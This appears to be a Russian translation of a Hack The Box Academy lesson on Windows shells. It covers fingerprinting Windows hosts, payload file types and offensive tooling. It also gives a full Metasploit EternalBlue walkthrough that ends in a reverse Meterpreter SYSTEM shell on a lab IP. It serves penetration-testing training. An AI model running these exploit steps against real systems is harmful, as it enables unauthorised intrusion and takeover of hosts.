

ЧИТАТЬ СУПЕР МНОГО ПОЭТОМУ ЛУЧШЕ ПОСМОТРЕТЬ НА САЙТЕ
 https://academy.hackthebox.com/beta/module/115/section/1109
 
Сколько себя помнят, Microsoft доминировала на рынках домашних и корпоративных вычислительных систем. В наши дни, с внедрением улучшенных функций Active Directory, расширением взаимодействия с облачными сервисами, подсистемой Windows для Linux и многим другим, поверхность атаки Microsoft также значительно расширилась.

Например, только за последние пять лет были `3688`зафиксированы уязвимости в продуктах Microsoft, и это число растет с каждым днем. Эта таблица была составлена ​​по [этой ссылке.](https://www.cvedetails.com/vendor/26/Microsoft.html)


---

#### Таблица уязвимостей Windows

![Таблица, показывающая количество уязвимостей и эксплойтов с 1999 по 2021 год. Она включает такие категории, как DoS-атаки, выполнение кода, переполнение памяти, повреждение памяти, SQL-инъекции, XSS, обход каталогов и многое другое. Для каждого года указано количество уязвимостей и эксплойтов, а внизу приведены итоговые значения и проценты.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/115/window-vulns-table.png)

## Известные уязвимости Windows

За последние несколько лет ряд уязвимостей в операционной системе Windows и соответствующие им атаки стали одними из самых часто используемых уязвимостей нашего времени. Давайте обсудим их подробнее:

|**Уязвимость**|**Описание**|
|---|---|
|`MS08-067`|MS08-067 — это критически важный патч, выпущенный для многих различных версий Windows из-за уязвимости в протоколе SMB. Эта уязвимость значительно упрощала проникновение в систему Windows. Она была настолько эффективна, что червь Conficker использовал её для заражения каждого уязвимого хоста, с которым сталкивался. Даже Stuxnet воспользовался этой уязвимостью.|
|`Eternal Blue`|MS17-010 — это эксплойт, обнаруженный в утечке данных Shadow Brokers от АНБ. Этот эксплойт наиболее известен использованием в кибератаках с использованием вируса-вымогателя WannaCry и NotPetya. В этой атаке использовалась уязвимость в протоколе SMB v1, позволяющая выполнять код. Считается, что EternalBlue заразил более 200 000 хостов только в 2017 году и до сих пор является распространенным способом получения доступа к уязвимым хостам Windows.|
|`PrintNightmare`|Уязвимость удаленного выполнения кода в службе диспетчера печати Windows. Имея действительные учетные данные для этого хоста или командную оболочку с низкими привилегиями, вы можете установить принтер, добавить драйвер, который будет работать за вас, и получить доступ к хосту на системном уровне. Эта уязвимость наносила ущерб компаниям на протяжении всего 2021 года. Пользователь 0xdf написал об этом отличную статью [здесь](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html) .|
|`BlueKeep`|CVE 2019-0708 — это уязвимость в протоколе RDP от Microsoft, позволяющая осуществлять удаленное выполнение кода. Эта уязвимость использовала неправильно вызванный канал для получения доступа к выполнению кода и затрагивала все версии Windows, от Windows 2000 до Server 2008 R2.|
|`Sigred`|Уязвимость CVE 2020-1350 использует недостаток в способе чтения DNS-записей ресурсов SIG. Она несколько сложнее, чем другие эксплойты в этом списке, но при правильном выполнении предоставит злоумышленнику права администратора домена, поскольку затронет DNS-сервер домена, который обычно является основным контроллером домена.|
|`SeriousSam`|Уязвимость CVE 2021-36934 использует уязвимость в способе обработки прав доступа к `C:\Windows\system32\config`папке в Windows. До исправления этой проблемы пользователи без повышенных прав имели доступ к базе данных SAM, а также к другим файлам. Это не является серьезной проблемой, поскольку доступ к файлам невозможен во время их использования компьютером, но становится опасным при работе с теневыми копиями томов. Аналогичные ошибки в управлении правами доступа существуют и в файлах резервных копий, позволяя злоумышленнику читать базу данных SAM и получать доступ к учетным данным.|
|`Zerologon`|CVE 2020-1472 — это критическая уязвимость, использующая криптографическую ошибку в протоколе Microsoft Active Directory Netlogon Remote Protocol (MS-NRPC). Она позволяет пользователям входить на серверы с помощью NT LAN Manager (NTLM) и даже отправлять изменения учетных записей через этот протокол. Атака может быть довольно сложной, но её легко осуществить, поскольку злоумышленнику потребуется сделать около 256 попыток угадать пароль учетной записи компьютера, прежде чем он найдет нужный. Это может произойти за несколько секунд.|

Учитывая эти уязвимости, Windows никуда не денется. Нам необходимо уметь выявлять уязвимости, использовать их и перемещаться по хостам и средам Windows. Понимание этих концепций также поможет нам защитить наши среды от атак. Теперь пришло время погрузиться в изучение некоторых интересных эксплойтов, ориентированных на Windows.

---

## Методы перечисления окон и дактилоскопии

Этот модуль предполагает, что вы уже выполнили этап перечисления хостов и понимаете, какие службы обычно встречаются на хостах. Мы просто пытаемся дать вам несколько быстрых приемов, чтобы определить, является ли хост, скорее всего, машиной под управлением Windows. Более подробное описание перечисления хостов и идентификации по отпечаткам можно найти в модуле « [Перечисление сети с помощью NMAP» .](https://academy.hackthebox.com/course/preview/network-enumeration-with-nmap)

Поскольку у нас есть набор целей, `what are a few ways to determine if the host is likely a Windows Machine`чтобы ответить на этот вопрос, мы можем рассмотреть несколько моментов. Во-первых, это `Time To Live`счетчик TTL (TTL) при использовании ICMP для определения доступности хоста. Типичный ответ от хоста Windows будет либо 32, либо 128. Ответ, равный или близкий к 128, является наиболее распространенным. Это значение не всегда может быть точным, особенно если вы находитесь не в той же сети третьего уровня, что и цель. Мы можем использовать это значение, поскольку большинство хостов никогда не будут находиться дальше 20 переходов от вашей точки происхождения, поэтому маловероятно, что счетчик TTL упадет в допустимые значения для другого типа ОС. В выводе команды ping `below`мы можем увидеть пример этого. В качестве примера мы пинговали хост Windows 10 и видим, что получили ответы с TTL 128. Посмотрите эту [ссылку](https://subinsb.com/default-device-ttl-values/) , чтобы увидеть удобную таблицу, показывающую другие значения TTL для разных ОС.

#### Хост получил пинг.

        shellsession
`MuraMitchi@htb[/htb]$ ping 192.168.86.39  PING 192.168.86.39 (192.168.86.39): 56 data bytes 64 bytes from 192.168.86.39: icmp_seq=0 ttl=128 time=102.920 ms 64 bytes from 192.168.86.39: icmp_seq=1 ttl=128 time=9.164 ms 64 bytes from 192.168.86.39: icmp_seq=2 ttl=128 time=14.223 ms 64 bytes from 192.168.86.39: icmp_seq=3 ttl=128 time=11.265 ms`

Еще один способ проверить, является ли хост Windows или нет, — использовать наш удобный инструмент `NMAP`. Nmap имеет встроенную функцию идентификации ОС и множество других скриптовых сканирований для проверки чего угодно, от конкретной уязвимости до информации, собранной из SNMP. В этом примере мы будем использовать опцию `-O`с подробным выводом `-v`для инициализации сканирования идентификации ОС для нашего целевого хоста `192.168.86.39`. Просматривая приведенную ниже сессию оболочки и изучая результаты, можно заметить несколько признаков, указывающих на то, что это хост Windows. Мы сосредоточимся на них чуть позже. Внимательно посмотрите на нижнюю часть сессии оболочки. Мы видим точку с метками `OS CPE: cpe:/o:microsoft:windows_10`и `OS details: Microsoft Windows 10 1709 - 1909`. Nmap сделал это предположение на основе нескольких различных метрик, полученных из стека TCP/IP. Он использует эти характеристики для определения ОС, проверяя ее по базе данных отпечатков ОС. В данном случае Nmap определил, что наш хост — это машина Windows 10 с уровнем ревизии от 1709 до 1909.

Если возникнут проблемы и сканирование даст мало результатов, попробуйте еще раз с параметрами `-A`и `-Pn`. Это выполнит другое сканирование и может сработать. Для получения дополнительной информации о том, как работает этот процесс, ознакомьтесь с этой статьей из [документации Nmap](https://nmap.org/book/man-os-detection.html) . Будьте осторожны с этим методом обнаружения. Внедрение брандмауэра или других функций безопасности может скрыть хост или исказить результаты. По возможности используйте несколько проверок для определения.

#### Сканирование обнаружения ОС

        shellsession
`MuraMitchi@htb[/htb]$ sudo nmap -v -O 192.168.86.39 Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 17:40 EDT Initiating ARP Ping Scan at 17:40 Scanning 192.168.86.39 [1 port] Completed ARP Ping Scan at 17:40, 0.12s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 17:40 Completed Parallel DNS resolution of 1 host. at 17:40, 0.02s elapsed Initiating SYN Stealth Scan at 17:40 Scanning desktop-jba7h4t.lan (192.168.86.39) [1000 ports] Discovered open port 139/tcp on 192.168.86.39 Discovered open port 135/tcp on 192.168.86.39 Discovered open port 443/tcp on 192.168.86.39 Discovered open port 445/tcp on 192.168.86.39 Discovered open port 902/tcp on 192.168.86.39 Discovered open port 912/tcp on 192.168.86.39 Completed SYN Stealth Scan at 17:40, 1.54s elapsed (1000 total ports) Initiating OS detection (try #1) against desktop-jba7h4t.lan (192.168.86.39) Nmap scan report for desktop-jba7h4t.lan (192.168.86.39) Host is up (0.010s latency). Not shown: 994 closed tcp ports (reset) PORT    STATE SERVICE 135/tcp open  msrpc 139/tcp open  netbios-ssn 443/tcp open  https 445/tcp open  microsoft-ds 902/tcp open  iss-realsecure 912/tcp open  apex-mesh MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate) Device type: general purpose Running: Microsoft Windows 10 OS CPE: cpe:/o:microsoft:windows_10 OS details: Microsoft Windows 10 1709 - 1909 Network Distance: 1 hop`

Теперь, когда мы знаем, что имеем дело с хостом Windows 10, нам нужно перечислить службы, которые мы видим, чтобы определить, есть ли у нас потенциальный путь для эксплуатации уязвимости. Для сбора информации о доступных портах мы можем использовать несколько различных инструментов. Netcat, Nmap и многие другие могут выполнить необходимое перечисление, но в данном случае мы рассмотрим простой скрипт Nmap под названием `nmap` `banner.nse`. Для каждого порта, который Nmap видит как активный, он попытается подключиться к этому порту и получить любую доступную информацию. В приведенном ниже примере Nmap попытался подключиться к каждому порту, но ответ дали только порты 902 и 912. Судя по баннеру страницы, они связаны с VMWare Workstation. Мы можем попытаться найти эксплойт, связанный с этим протоколом, или же продолжить перечисление других портов. В реальном тестировании на проникновение вам нужно быть максимально тщательным, чтобы иметь полное представление о ситуации.

#### Перехват баннера для перечисления портов

        shellsession
`MuraMitchi@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nse Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 18:01 EDT NSE: Loaded 1 scripts for scanning. <snip> Discovered open port 135/tcp on 192.168.86.39 Discovered open port 139/tcp on 192.168.86.39 Discovered open port 445/tcp on 192.168.86.39 Discovered open port 443/tcp on 192.168.86.39 Discovered open port 912/tcp on 192.168.86.39 Discovered open port 902/tcp on 192.168.86.39 Completed SYN Stealth Scan at 18:01, 1.46s elapsed (1000 total ports) NSE: Script scanning 192.168.86.39. Initiating NSE at 18:01 Completed NSE at 18:01, 20.11s elapsed Nmap scan report for desktop-jba7h4t.lan (192.168.86.39) Host is up (0.012s latency). Not shown: 994 closed tcp ports (reset) PORT    STATE SERVICE 135/tcp open  msrpc 139/tcp open  netbios-ssn 443/tcp open  https 445/tcp open  microsoft-ds 902/tcp open  iss-realsecure | banner: 220 VMware Authentication Daemon Version 1.10: SSL Required, Se |_rverDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , , NFCSSL supported/t 912/tcp open  apex-mesh | banner: 220 VMware Authentication Daemon Version 1.0, ServerDaemonProto |_col:SOAP, MKSDisplayProtocol:VNC , , MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)`

Приведенные выше примеры — лишь несколько способов создания идентификационных отпечатков и определения, является ли хост машиной под управлением Windows. Это далеко не полный список, и существует множество других проверок, которые можно выполнить. Теперь, когда мы обсудили создание идентификационных отпечатков, давайте рассмотрим несколько типов файлов и то, для чего их можно использовать при создании полезных нагрузок.

---

## Файлы .bat, DLL и MSI — чего только нет!

Когда дело доходит до создания полезных нагрузок для хостов Windows, у нас есть множество вариантов на выбор. DLL-файлы, пакетные файлы, MSI-пакеты и даже сценарии PowerShell — одни из самых распространенных методов. Каждый тип файла может выполнять разные задачи, но всех их объединяет то, что они являются исполняемыми на хосте. Старайтесь учитывать механизм доставки полезной нагрузки, поскольку это может определить, какой тип полезной нагрузки вы будете использовать.

#### Типы полезной нагрузки, которые следует учитывать

- [DLL-файлы](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) (динамически подключаемые библиотеки) — это библиотечные файлы, используемые в операционных системах Microsoft для предоставления общего кода и данных, которые могут использоваться множеством различных программ одновременно. Эти файлы являются модульными и позволяют создавать более динамичные приложения, которые проще обновлять. Для специалиста по тестированию на проникновение внедрение вредоносной DLL-библиотеки или захват уязвимой библиотеки на хосте может повысить наши привилегии до уровня SYSTEM и/или обойти контроль учетных записей пользователей.
- [Пакетные](https://commandwindows.com/batch.htm) файлы — это текстовые DOS-скрипты, используемые системными администраторами для выполнения различных задач через интерпретатор командной строки. Эти файлы имеют расширение `.batch` `.bat`. Мы можем использовать пакетные файлы для автоматического выполнения команд на хосте. Например, мы можем настроить пакетный файл на открытие порта на хосте или на подключение к нашей атакующей машине. После этого он может выполнить основные шаги по перечислению и передать нам информацию обратно через открытый порт.
- [VBS (](https://www.guru99.com/introduction-to-vbscript.html) VBScript) — это легковесный скриптовый язык, основанный на Visual Basic от Microsoft. Обычно он используется в качестве клиентского скриптового языка на веб-серверах для создания динамических веб-страниц. VBS устарел и отключен большинством современных веб-браузеров, но продолжает существовать в контексте фишинга и других атак, направленных на то, чтобы заставить пользователей выполнить определенное действие, например, включить загрузку макросов в документе Excel или щелкнуть по ячейке, чтобы запустить выполнение кода механизмом сценариев Windows.
- [Файлы MSI](https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions) `.MSI` служат базой данных для установки Windows Installer. При попытке установить новое приложение установщик будет искать файл .msi, чтобы понять, какие компоненты необходимы и как их найти. Мы можем использовать Windows Installer, создав полезную нагрузку в виде файла .msi. После того, как мы получим этот файл на хосте, мы можем запустить его, `msiexec`чтобы выполнить наш файл, что предоставит нам дополнительные возможности доступа, например, обратную оболочку с повышенными правами.
- [PowerShell](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1) — это одновременно и среда командной оболочки, и язык сценариев. Он служит современной средой командной оболочки в операционных системах Microsoft. Как язык сценариев, это динамический язык, основанный на среде выполнения .NET Common Language Runtime, который, подобно своему компоненту оболочки, принимает входные и выходные данные в виде объектов .NET. PowerShell предоставляет множество возможностей для получения доступа к командной оболочке и выполнения команд на хосте, а также для многих других шагов в процессе тестирования на проникновение.

Теперь, когда мы понимаем, для чего можно использовать каждый тип файлов Windows, давайте обсудим некоторые основные инструменты, тактики и процедуры для создания полезных нагрузок и их доставки на хост для получения командной оболочки.

---

## Инструменты, тактика и процедуры для генерации, передачи и выполнения полезной нагрузки

Ниже вы найдете примеры различных методов генерации полезной нагрузки и способов ее передачи жертве. Мы рассмотрим некоторые из этих методов в общих чертах, поскольку наше внимание сосредоточено на самой генерации полезной нагрузки и различных способах получения оболочки на цели.

#### Генерация полезной нагрузки

У нас есть множество хороших вариантов для генерации полезных нагрузок для использования против хостов Windows. Некоторые из них мы уже затрагивали в предыдущих разделах. Например, Metasploit-Framework и MSFVenom — очень удобный способ генерации полезных нагрузок, поскольку он не зависит от операционной системы. В таблице ниже представлены некоторые из наших вариантов. Однако это не исчерпывающий список, и новые ресурсы появляются ежедневно.

|**Ресурс**|**Описание**|
|---|---|
|`MSFVenom & Metasploit-Framework`|[Source](https://github.com/rapid7/metasploit-framework) MSF — чрезвычайно универсальный инструмент в арсенале любого пентестера. Он позволяет перечислять хосты, генерировать полезные нагрузки, использовать общедоступные и собственные эксплойты, а также выполнять действия после эксплуатации на хосте. Представьте его как универсальный инструмент.|
|`Payloads All The Things`|[Здесь](https://github.com/swisskyrepo/PayloadsAllTheThings) вы найдете множество различных ресурсов и шпаргалок по генерации полезной нагрузки и общей методологии.|
|`Mythic C2 Framework`|[Источник:](https://github.com/its-a-feature/Mythic) Фреймворк Mythic C2 — это альтернатива Metasploit в качестве системы управления и контроля, а также набора инструментов для генерации уникальных полезных нагрузок.|
|`Nishang`|[Source](https://github.com/samratashok/nishang) Nishang — это набор инструментов и скриптов PowerShell для проведения атак на уязвимости. Он включает в себя множество утилит, которые могут быть полезны любому специалисту по тестированию на проникновение.|
|`Darkarmour`|[Source](https://github.com/bats3c/darkarmour) Darkarmour — это инструмент для генерации и использования обфусцированных бинарных файлов для работы на хостах под управлением Windows.|

#### Передача и выполнение полезной нагрузки:

Помимо таких способов доставки вредоносного ПО, как веб-трафик, фишинговые электронные письма или тайники, хосты под управлением Windows могут предоставлять нам несколько других путей. Ниже приведен список полезных инструментов и протоколов для использования при попытке разместить вредоносное ПО на целевом объекте.

- `Impacket`[Impacket](https://github.com/SecureAuthCorp/impacket) — это набор инструментов, написанный на Python, который предоставляет нам возможность напрямую взаимодействовать с сетевыми протоколами. Среди наиболее интересных инструментов Impacket — поддержка `psexec`Kerberos `smbclient`и `wmi`возможность развертывания SMB-сервера.
- [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md) — отличный ресурс для поиска быстрых однострочных команд, которые помогут оперативно передавать файлы между хостами.
- `SMB`Протокол SMB может предоставлять легко уязвимый путь для передачи файлов между хостами. Это особенно полезно, когда хосты-жертвы подключены к домену и используют общие ресурсы для размещения данных. Мы, как злоумышленники, можем использовать эти общие файловые ресурсы SMB вместе с C$ и admin$ для размещения и передачи наших полезных нагрузок и даже для кражи данных по каналам связи.
- `Remote execution via MSF`Во многие модули эксплойтов Metasploit встроена функция, которая автоматически собирает, подготавливает и выполняет полезные нагрузки.
- `Other Protocols`При анализе хоста обратите внимание на протоколы, такие как FTP, TFTP, HTTP/S и другие, которые позволяют загружать файлы на хост. Перечислите и обратите внимание на функции, которые открыты и доступны для использования.

Теперь, когда мы знаем, какие инструменты, тактики и процедуры мы можем использовать для передачи наших полезных нагрузок, давайте рассмотрим пример процесса компрометации.

---

## Пример пошагового разбора компромисса

1. Перечислите Хозяина

Ping, Netcat, сканирование Nmap и даже Metasploit — все это хорошие варианты для начала поиска потенциальных жертв. На этот раз мы воспользуемся сканированием Nmap. Поиск целей в любой цепочке эксплойтов, пожалуй, является наиболее важной частью головоломки. Понимание цели и принципов ее работы повысит ваши шансы на получение командной оболочки.

#### Перечислите Хостесс

        shellsession
`MuraMitchi@htb[/htb]$ nmap -v -A 10.129.201.97 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 18:13 EDT NSE: Loaded 153 scripts for scanning. NSE: Script Pre-scanning. Discovered open port 135/tcp on 10.129.201.97 Discovered open port 80/tcp on 10.129.201.97 Discovered open port 445/tcp on 10.129.201.97 Discovered open port 139/tcp on 10.129.201.97 Completed Connect Scan at 18:13, 12.76s elapsed (1000 total ports) Completed Service scan at 18:13, 6.62s elapsed (4 services on 1 host) NSE: Script scanning 10.129.201.97. Nmap scan report for 10.129.201.97 Host is up (0.13s latency). Not shown: 996 closed ports PORT    STATE SERVICE      VERSION 80/tcp  open  http         Microsoft IIS httpd 10.0 | http-methods:  |   Supported Methods: OPTIONS TRACE GET HEAD POST |_  Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: 10.129.201.97 - / 135/tcp open  msrpc        Microsoft Windows RPC 139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn 445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s | smb-os-discovery:  |   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) |   Computer name: SHELLS-WINBLUE |   NetBIOS computer name: SHELLS-WINBLUE\x00 |   Workgroup: WORKGROUP\x00 |_  System time: 2021-09-27T15:13:28-07:00 | smb-security-mode:  |   account_used: <blank> |   authentication_level: user |   challenge_response: supported |_  message_signing: disabled (dangerous, but default) | smb2-security-mode:  |   2.02:  |_    Message signing enabled but not required | smb2-time:  |   date: 2021-09-27T22:13:30 |_  start_date: 2021-09-23T15:29:29`

В ходе сканирования и проверки рассматриваемого хоста мы выяснили несколько вещей. На нем запущена программа `Windows Server 2016 Standard 6.3`. Теперь у нас есть имя хоста, и мы знаем, что он не входит в домен и на нем запущено несколько служб. Теперь, когда мы собрали некоторую информацию, давайте определим потенциальный путь для эксплуатации уязвимости.  
`IIS`Возможным путем может быть попытка доступа к хосту по протоколу SMB с использованием такого инструмента, как Impacket, или аутентификация, если у нас есть учетные данные. С точки зрения операционной системы, может существовать и путь для удаленного выполнения кода (RCE). MS17-010 (EternalBlue) известен тем, что поражает хосты от Windows 2008 до Server 2016. Учитывая это, можно с уверенностью сказать, что наша жертва уязвима, поскольку она попадает в этот диапазон. Давайте проверим это, используя встроенную вспомогательную проверку из `Metasploit`.`auxiliary/scanner/smb/smb_ms17_010`

2. Найдите и определите путь для эксплуатации уязвимости.

Откройте `msfconsole`и найдите EternalBlue, или вы можете использовать строку из приведенной ниже сессии для выполнения проверки. Задайте в поле RHOSTS IP-адрес целевого объекта и запустите сканирование. Как видно в параметрах модуля, вы можете заполнить дополнительные параметры SMB, но это необязательно. Они помогут повысить вероятность успешного завершения проверки. Когда будете готовы, введите `run`.

#### Определите путь для эксплуатации уязвимости.

        shellsession
`msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010  msf6 auxiliary(scanner/smb/smb_ms17_010) > show options Module options (auxiliary/scanner/smb/smb_ms17_010):    Name         Current Setting                 Required  Description   ----         ---------------                 --------  -----------   CHECK_ARCH   true                            no        Check for architecture on vulnerable hosts   CHECK_DOPU   true                            no        Check for DOUBLEPULSAR on vulnerable hosts   CHECK_PIPE   false                           no        Check for named pipe on vulnerable hosts   NAMED_PIPES  /usr/share/metasploit-framewor  yes       List of named pipes to check                k/data/wordlists/named_pipes.t                xt   RHOSTS                                       yes       The target host(s), range CIDR identifier, or hosts f                                                          ile with syntax 'file:<path>'   RPORT        445                             yes       The SMB service port (TCP)   SMBDomain    .                               no        The Windows domain to use for authentication   SMBPass                                      no        The password for the specified username   SMBUser                                      no        The username to authenticate as   THREADS      1                               yes       The number of concurrent threads (max one per host) msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97 RHOSTS => 10.129.201.97 msf6 auxiliary(scanner/smb/smb_ms17_010) > run [+] 10.129.201.97:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit) [*] 10.129.201.97:445     - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed`

Теперь, как видно из результатов проверки, наша цель, вероятно, уязвима для EternalBlue. Давайте подготовим эксплойт и полезную нагрузку, а затем попробуем.

3. Выберите «Эксплойт и полезная нагрузка», затем «Доставить».

#### Выберите и настройте наш эксплойт и полезную нагрузку.

        shellsession
`msf6 > search eternal Matching Modules ================    #  Name                                           Disclosure Date  Rank     Check  Description   -  ----                                           ---------------  ----     -----  -----------   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution`

В данном случае мы просмотрели модули эксплойтов MSF, используя функцию поиска, чтобы найти эксплойт, соответствующий EternalBlue. Приведенный выше список — результат поиска. Поскольку мне больше повезло с версией `psexec`этого эксплойта, мы попробуем сначала её. Давайте выберем её и продолжим настройку.

#### Настройка эксплойта и полезной нагрузки

        shellsession
`msf6 > use 2 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp msf6 exploit(windows/smb/ms17_010_psexec) > options Module options (exploit/windows/smb/ms17_010_psexec):    Name                  Current Setting              Required  Description   ----                  ---------------              --------  -----------   DBGTRACE              false                        yes       Show extra debug trace info   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction   NAMEDPIPE                                          no        A named pipe that can be connected to (leave bl                                                                ank for auto)   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check                         work/data/wordlists/named_p                         ipes.txt   RHOSTS                                             yes       The target host(s), range CIDR identifier, or h                                                                osts file with syntax 'file:<path>'   RPORT                 445                          yes       The Target port (TCP)   SERVICE_DESCRIPTION                                no        Service description to to be used on target for                                                                 pretty listing   SERVICE_DISPLAY_NAME                               no        The service display name   SERVICE_NAME                                       no        The service name   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share                                                                (ADMIN$,C$,...) or a normal read/write folder s                                                                hare   SMBDomain             .                            no        The Windows domain to use for authentication   SMBPass                                            no        The password for the specified username   SMBUser                                            no        The username to authenticate as Payload options (windows/meterpreter/reverse_tcp):    Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)   LHOST     192.168.86.48    yes       The listen address (an interface may be specified)   LPORT     4444             yes       The listen port`

Перед запуском эксплойта обязательно правильно настройте параметры полезной нагрузки. Все параметры, для которых установлено `Required`значение «да», необходимо заполнить. В данном случае нам нужно убедиться, что все `RHOSTS, LHOST, and LPORT`поля заданы правильно. Для этой попытки допустимо использовать значения по умолчанию для остальных параметров.

#### Проверьте наши варианты

        shellsession
`msf6 exploit(windows/smb/ms17_010_psexec) > show options Module options (exploit/windows/smb/ms17_010_psexec):    Name                  Current Setting              Required  Description   ----                  ---------------              --------  -----------   DBGTRACE              false                        yes       Show extra debug trace info   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction   NAMEDPIPE                                          no        A named pipe that can be connected to (leave bl                                                                ank for auto)   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check                         work/data/wordlists/named_p                         ipes.txt   RHOSTS                10.129.201.97                yes       The target host(s), range CIDR identifier, or h                                                                osts file with syntax 'file:<path>'   RPORT                 445                          yes       The Target port (TCP)   SERVICE_DESCRIPTION                                no        Service description to to be used on target for                                                                 pretty listing   SERVICE_DISPLAY_NAME                               no        The service display name   SERVICE_NAME                                       no        The service name   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share                                                                (ADMIN$,C$,...) or a normal read/write folder s                                                                hare   SMBDomain             .                            no        The Windows domain to use for authentication   SMBPass                                            no        The password for the specified username   SMBUser                                            no        The username to authenticate as Payload options (windows/meterpreter/reverse_tcp):    Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)   LHOST     10.10.14.12      yes       The listen address (an interface may be specified)   LPORT     4444             yes       The listen port`

На этот раз мы решили упростить задачу и использовали только `windows/meterpreter/reverse_tcp`полезную нагрузку. Вы можете изменить это по своему желанию, выбрав другой тип оболочки или еще больше замаскировав атаку, как показано в предыдущих разделах о полезных нагрузках. Настроив параметры, давайте попробуем и посмотрим, удастся ли нам попасть в цель.

4. Выполните атаку и получите обратный вызов.

#### Осуществим атаку

        shellsession
`msf6 exploit(windows/smb/ms17_010_psexec) > exploit [*] Started reverse TCP handler on 10.10.14.12:4444  [*] 10.129.201.97:445 - Target OS: Windows Server 2016 Standard 14393 [*] 10.129.201.97:445 - Built a write-what-where primitive... [+] 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained! [*] 10.129.201.97:445 - Selecting PowerShell target [*] 10.129.201.97:445 - Executing the payload... [+] 10.129.201.97:445 - Service start timed out, OK if running a command or non-service executable... [*] Sending stage (175174 bytes) to 10.129.201.97 [*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.129.201.97:50215) at 2021-09-27 18:58:00 -0400 meterpreter > getuid Server username: NT AUTHORITY\SYSTEM meterpreter >`

Успех! Мы успешно выполнили эксплойт и получили доступ к командной оболочке. `SYSTEM`Причем к командной оболочке высокого уровня. Как было показано в предыдущих модулях MSF, теперь, когда у нас открыта сессия через Meterpreter, мы видим приглашение командной `meterpreter >` строки. Отсюда мы можем использовать Meterpreter для выполнения дальнейших команд, чтобы собрать системную информацию, украсть учетные данные пользователя или использовать другой модуль постэксплойта против хоста. Если вы хотите взаимодействовать с хостом напрямую, вы также можете подключиться к интерактивной командной оболочке на хосте из Meterpreter.

5. Определите исходную оболочку.

#### Определите нашу раковину

        shellsession
`meterpreter > shell Process 4844 created. Channel 1 created. Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\Windows\system32>`

Когда мы выполнили команду Meterpreter `shell`, она запустила другой процесс на хосте и перевела нас в системную оболочку. Можете ли вы определить, в какой мы зоне, по командной строке? Даже просто увидев её, `C:\Windows\system32>`мы можем понять, что находимся в другой оболочке `cmd.exe shell`. Чтобы убедиться в этом, достаточно запустить команду help из оболочки. Если бы мы попали в PowerShell, наша командная строка выглядела бы так: `<имя_сервера>` `PS C:\Windows\system32>`. `PS` перед `<имя_сервера>` указывает на то, что это сессия PowerShell. Поздравляем с попаданием в оболочку на нашем последнем взломанном хосте Windows.

Теперь, когда мы рассмотрели пример процесса компрометации, давайте изучим оболочки, которые вы можете увидеть, подключившись к хосту.

---

## Командная строка и Power Shell — для развлечения и получения прибыли.

Нам повезло, что на хостах Windows по умолчанию доступны не одна, а две оболочки на выбор. Возможно, вы сейчас задаетесь вопросом:

`Which one is the right one to use?`

Ответ прост: выбирайте то, что вам нужно в данный момент. Сравните `cmd`их, `PowerShell`чтобы понять, что они предлагают и когда лучше выбрать один вариант вместо другого.

